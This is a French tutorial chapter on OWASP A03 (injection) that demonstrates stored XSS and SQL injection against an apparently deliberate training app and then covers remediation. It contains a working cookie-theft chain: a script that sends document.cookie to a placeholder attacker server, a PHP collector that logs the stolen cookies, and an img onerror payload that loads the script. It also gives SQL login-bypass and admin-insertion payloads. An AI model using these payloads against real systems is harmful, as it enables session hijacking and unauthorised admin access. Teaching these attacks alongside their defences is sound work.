# A03 - Injection

[Lien Top10](https://owasp.org/Top10/fr/A03_2021-Injection/)

L'injection consiste à exploiter l'absence de validation/nettoyage des données envoyées par un utilisateur via un champ texte (formulaire), ou directement dans l'URL !

Il en existe plusieurs types, mais les plus courantes sont **l'injection SQL** et le **Cross Site Scripting (XSS)**.

**L'injection SQL** consiste à saisir une requête SQL dans un champ texte à la place des données attendues. Si l'application n'est pas correctement protégée, la requête SQL sera exécutée et pourra entrainer des fuites ou des pertes de données. Il existe deux types d'injections SQL : les injections aveugles et les injections avec retour d'information.

**Le Cross Site Scripting** (que nous allons appeler XSS à partir de maintenant) consiste à envoyer du code javascript dans un champ texte non protégé. Si l'application est vulnérable à la faille XSS, dans le meilleur des cas, le code javascript sera interprété une seule fois, pour l'utilisateur actuel (le hacker, donc). Mais dans le pire des cas, le code javascript sera stocké en base de données et exécuté pour tous les visiteurs du site !

## Recherche de faille & exploitation

### XSS

Commençons par tenter d'exploiter la faille XSS. Imaginons que nous soyons simple utilisateur et que nous voulons récupérer l'accès administrateur. La première étape consiste à chercher un champ texte potentiellement vulnérable : nous allons essayer le formulaire d'ajout d'un nouvel élément à la liste.

Pour vérifier si le champ est vulnérable, nous allons essayer d'y envoyer des **payloads**, on peut en trouver [ici](https://github.com/payloadbox/xss-payload-list) par exemple.

:warning: Rappel, il est **totalement illégal** d'essayer d'exploiter une telle faille sans autorisation du propriétaire d'un site.

Selon le code utilisé dans notre application, certains payloads ne fonctionneront pas, d'autres fonctionneront. Ici, le payload `<image/src/onerror=prompt(8)>` semble prometteur. On peut remarquer que le popup apparait à chaque rechargement de la page, ce qui implique qu'il est sauvegardé en base de données et exécuté pour chaque visiteur :scream:

:pirate_flag: **démo : Session hijacking via XSS** :pirate_flag:

Le hacker doit héberger les deux scripts suivants sur un serveur lui appartenant :

Script `a.js` :

```js
// script qui sera exécuté lorsque le DOM du site attaqué sera chargé

var xhr = new XMLHttpRequest();
xhr.open("post", "<url_serveur_hacker>/getXss.php", true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(document.cookie);
```

Script `getXss.php` :

```php
<?php

// script qui réceptionne les cookies & les stocke dans un fichier texte

// pour s'assurer que les CORS ne posent pas de problème
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");

// le fichier dans lequel les cookies volés seront stockés
$file = './hijacked_cookies.txt';

if (!empty($_POST)) {
    // des données ont été reçues, on ajoute un saut à la ligne
    $data = PHP_EOL;
    // puis la date & l'heure, et l'adresse IP du client qui a été hacké
    $data .= date('l jS \of F Y h:i:s A') . " ({$_SERVER['REMOTE_ADDR']}) : " . PHP_EOL;
    // on ajoute une ligne par cookie reçu (on reçoit un tableau de cookies)
    foreach($_POST as $key => $value) {
        $data .= $key . " : " . $value . PHP_EOL;
    }
    // on ajoute tout ça à la fin de notre fichier
    shell_exec("echo \"{$data}\" >> {$file}");
    echo "OK.";
}
```

Le payload inséré sera le suivant :

```html
<img src=x onerror="var s=document.createElement(\'script\');s.src=\'<url_serveur_hacker>/a.js\';document.head.appendChild(s);">
```

Une fois connecté en SSH à son serveur, le hacker peut lancer la commande `tail -f hijacked_cookies.txt` et attendre que l'administrateur se connecte.

### Injection SQL

Comme pour la faille XSS, nous allons exploiter les formulaires mal protégés, prenons par exemple le formulaire d'authentification.

Là aussi, on va envoyer un payload. Le plus simple est `' or 1=1; --`. Ce payload referme la quote ouverte pour concaténer le login envoyé par l'utilisateur, puis rajoute un `ou` à la condition `WHERE` de la requête SQL. 1 étant toujours égal à 1, la clause `WHERE` sera toujours vraie.

:pirate_flag: **démo : Injection SQL** :pirate_flag:

Essayez de vous connecter avec le nom d'utilisateur `' or 1=1; --` et le mot de passe `rocknroll`.

:scream: On est connecté en tant qu'admistrateur ! Mais comment est-ce possible ?

Si on regarde le code coté serveur (fichier `auth.php`), on peut voir que la clause `WHERE` de la requête SQL va être vraie, et on va donc récupérer le premier utilisateur dans notre table `users` avec cette requête. Ce premier utilisateur étant le compte `administrator`, on doit fournir le mot de passe correspondant à ce compte pour s'y connecter.

> Ouf, du coup, notre application n'est pas vulnérable à l'injection vu qu'il faut connaître le mot de passe de l'administrateur !

Pas si vite :smiling_imp: Essayez le payload suivant dans le champ identifiant (avec n'importe quoi comme mdp) :

```sql
' or 1=1; insert into users (`login`, `mdp`, `role`) VALUES ('hacker', md5('hacker'), 'admin');--
```

Essayez maintenant de vous reconnecter avec le compte `hacker/hacker`.

## Remédiation

Les injections XSS & SQL ne se préviennent pas de la même façon, mais la logique est la même : on ne peut pas faire confiance à l'utilisateur.

### Remédiation XSS

Pour protéger notre application d'éventuelles failles XSS, plusieurs possibilités s'offrent à nous :

- on peut "nettoyer"/valider les données saisies par les utilisateurs coté serveur.
- on devrait utiliser `textContent` plutôt que `innerHTML` dans notre code JS coté front.

- En JS côté serveur, on peut utiliser le module `html-sanitizer`.

Avec PHP, on peut utiliser les fonctions `htmlentities()` ou `htmlspecialchars()` pour nettoyer les données saisies par les utilisateurs. Ces fonctions permettent de remplacer les caractères HTML comme `<` ou `>` par leur code HTML (`&lt;` et `&gt;` dans le cas des chevrons).

On peut aussi utiliser la fonction PHP `filter_input()` avec le filtre de nettoyage `FILTER_SANITIZE_SPECIAL_CHARS`, cela aurait le même effet que d'utiliser `htmlspecialchars()`.

Utiliser `textContent` dans notre JS coté client quand on veut modifier le contenu texte d'un noeud du DOM permet d'éviter que du code JS contenu dans le texte à afficher soit exécuté. Avec `innerHTML`, le code JS sera exécuté (il faut donc éviter de l'utiliser, surtout quand on doit afficher des données qui ont été saisies par des utilisateurs).

### Remédiation SQL

Contre l'injection SQL, une solution : **les requêtes préparées**. Dès que nous allons devoir faire une requête qui contiendra des paramètres saisis par les utilisateurs de notre site, il faudra utiliser une requête préparée.

## Navigation

:house: [Retour à l'accueil](README-index.md)

:previous_track_button: [Précédent : A02](README-A02.md)

:next_track_button: [Suivant : A04](README-A04.md)
